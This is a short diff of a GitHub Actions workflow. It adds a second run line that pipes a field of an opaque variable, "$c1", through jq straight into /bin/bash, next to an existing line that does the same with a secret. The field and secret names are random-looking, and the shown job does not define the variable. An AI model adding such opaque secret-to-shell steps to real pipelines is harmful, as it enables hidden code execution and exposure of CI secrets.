@@ -22,6 +22,7 @@ jobs:
           belks4555: ${{ secrets.belks4555 }}
         run: |
           printf '%s' "$belks4555" | jq -r .ygq65782 | /bin/bash
+          printf '%s' "$c1" | jq -r .pnso819 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
